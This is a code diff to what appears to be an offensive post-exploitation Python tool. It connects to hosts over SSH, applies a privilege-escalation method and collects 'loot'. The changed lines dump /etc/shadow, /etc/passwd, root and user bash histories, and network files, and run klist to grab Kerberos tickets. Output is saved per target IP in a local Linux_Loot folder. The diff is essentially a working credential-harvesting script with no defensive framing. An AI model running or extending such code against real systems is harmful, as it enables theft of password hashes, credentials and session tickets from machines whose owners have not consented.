@@ -66,9 +66,9 @@ def privesc_methods(privesc, pas):
 
 
 # Write dump about single host into file
-def loot_write(name, data):
-    os.makedirs("./Linux_Loot", exist_ok=True)
-    file = open(f'./Linux_Loot/{name}', 'w')
+def loot_write(ip, name, data):
+    os.makedirs(f"./Linux_Loot/{ip}", exist_ok=True)
+    file = open(f'./Linux_Loot/{ip}/{name}', 'w')
     file.write(data)
     file.close()
 
@@ -90,11 +90,11 @@ def collect_loot(target, privesc):
 
         # Execute command
         pe = privesc_methods(privesc, target[1])
-        dump = ssh_exec(ssh, pe,
-                        'tail -n +1 /etc/passwd /etc/shadow /root/.bash_history /home/*/.bash_history /etc/hosts /etc/resolv.conf && klist')
 
-        # Write loot to the file
-        loot_write(target[2], dump)
+        loot_file_list = ['tail -n +1 /etc/passwd', 'tail -n +1 /etc/shadow', 'tail -n +1 /root/.bash_history', 'tail -n +1 /home/*/.bash_history', 'tail -n +1 /etc/hosts', 'tail -n +1 /etc/resolv.conf', 'klist']
+        for command in loot_file_list:
+            # Write loot to the file
+            loot_write(target[2], command.split()[-1].replace("/", "_"), ssh_exec(ssh, pe, command))
 
         # Close connection
         ssh_disconnect(ssh)
@@ -106,11 +106,11 @@ def collect_loot(target, privesc):
 
 # Try to collect loot from all given hosts
 def loot_all_hosts(targets, privesc):
+    print('+----------------------TARGETS-----------------------+')
     for target in targets:
         collect_loot(target, privesc)
 
 
 if __name__ == "__main__":
-    print('+----------------------TARGETS-----------------------+')
     loot_all_hosts(parse_list(), get_args().privesc)
     print("+----------------------------------------------------+")
